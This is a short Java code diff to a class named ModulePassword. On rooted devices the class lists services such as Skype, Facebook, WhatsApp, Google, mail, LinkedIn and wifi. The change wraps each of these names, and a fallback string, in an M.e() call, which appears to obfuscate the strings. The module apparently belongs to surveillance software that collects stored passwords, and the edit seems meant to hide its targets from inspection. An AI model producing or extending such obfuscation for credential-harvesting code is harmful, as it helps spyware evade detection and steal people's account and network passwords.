@@ -34,14 +34,14 @@ public class ModulePassword extends BaseModule {
 	@Override
 	protected boolean parse(ConfModule conf) {
 		if (Status.self().haveRoot()) {
-			services.put("skype", 0x02);
-			services.put("facebook", 0x03);
-			services.put("twitter", 0x04);
-			services.put("google", 0x05);
-			services.put("whatsapp", 0x07);
-			services.put("mail", 0x09);
-			services.put("linkedin", 0x0a);
-			services.put("wifi", 0x0b);
+			services.put(M.e("skype"), 0x02);
+			services.put(M.e("facebook"), 0x03);
+			services.put(M.e("twitter"), 0x04);
+			services.put(M.e("google"), 0x05);
+			services.put(M.e("whatsapp"), 0x07);
+			services.put(M.e("mail"), 0x09);
+			services.put(M.e("linkedin"), 0x0a);
+			services.put(M.e("wifi"), 0x0b);
 
 			return true;
 		} else {
@@ -221,7 +221,7 @@ public class ModulePassword extends BaseModule {
 				return key;
 			}
 		}
-		return "service";
+		return M.e("service");
 
 	}
 
